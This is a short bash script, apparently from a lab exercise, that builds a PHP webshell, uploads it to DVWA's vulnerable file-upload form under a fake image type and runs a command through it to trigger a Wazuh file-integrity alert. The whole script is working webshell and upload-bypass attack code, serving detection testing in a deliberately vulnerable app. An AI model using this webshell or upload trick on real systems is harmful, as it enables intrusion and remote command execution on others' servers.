#!/usr/bin/env bash
# Ataque 4 - Subida de webshell (MITRE T1505.003). Dispara integridad de archivos (FIM) en Wazuh.
set -euo pipefail; source "$(dirname "$0")/lib.sh"
dvwa_login
SHELL=/tmp/tienda_shell.php
echo '<?php echo "WEBSHELL TiendaCR (prueba de laboratorio): "; system($_GET["c"] ?? "id"); ?>' > "$SHELL"
echo "[*] $(date '+%T') Subiendo $SHELL al formulario vulnerable de DVWA"
curl -s -b "$COOKIE" -F "MAX_FILE_SIZE=100000" -F "uploaded=@$SHELL;type=image/png" -F "Upload=Upload" \
     "$BASE/vulnerabilities/upload/" | grep -oE 'succesfully uploaded|../../hackable[^<]*' | head -1
echo "[*] $(date '+%T') Ejecutando la webshell (prueba de que quedó activa)"
curl -s -b "$COOKIE" "$BASE/hackable/uploads/tienda_shell.php?c=id"
echo "[*] $(date '+%T') Fin. Revise la alerta de integridad en el panel (regla 100120)"
